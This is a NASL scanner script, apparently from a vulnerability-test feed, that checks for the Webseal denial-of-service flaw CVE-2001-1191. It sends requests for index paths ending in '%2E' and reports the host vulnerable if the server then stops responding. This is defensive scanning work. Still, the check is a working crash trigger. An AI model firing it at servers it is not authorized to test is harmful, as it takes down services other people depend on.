# SPDX-FileCopyrightText: 2002 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11089");
  script_version("2024-06-13T05:05:46+0000");
  script_tag(name:"last_modification", value:"2024-06-13 05:05:46 +0000 (Thu, 13 Jun 2024)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/3685");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2001-1191");
  script_name("Webseal DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "httpver.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "global_settings.nasl",
                      "gb_microsoft_iis_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade your server or firewall it.");

  script_tag(name:"summary", value:"The remote web server dies when an URL ending with %2E is requested.");

  script_tag(name:"impact", value:"An attacker may use this flaw to make your server crash continually.");

  script_tag(name:"affected", value:"Webseal version 3.8 is known to be affected. Other versions or
  products might be affected as well.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);
if(!http_can_host_asp(port:port))
  exit(0);

if(http_is_dead(port:port))
  exit(0);

soc = http_open_socket(port);
if(!soc)
  exit(0);

foreach url(make_list("/index.html", "/index.htm", "/index.asp", "/")) {

  req = http_get(port:port, item:string(url, "%2E"));
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);

  soc = http_open_socket(port);
  if(!soc)
    break;
}

# We must close the socket, VNC limits the number of parallel connections
if(soc)
  http_close_socket(soc);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(99);
